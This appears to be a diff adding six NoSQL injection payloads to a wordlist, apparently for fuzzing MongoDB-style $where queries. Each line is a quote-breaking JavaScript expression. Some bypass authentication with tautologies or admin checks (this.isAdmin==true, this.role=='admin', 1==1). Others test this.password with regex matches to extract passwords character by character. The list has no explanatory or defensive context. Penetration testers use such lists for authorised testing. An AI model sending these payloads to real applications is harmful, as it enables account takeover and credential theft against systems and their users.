@@ -1,0 +1,6 @@
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' || this.isAdmin==true
+' || this.role=='admin
+' || this.password.match(/^abc/)//
+' || 1==1
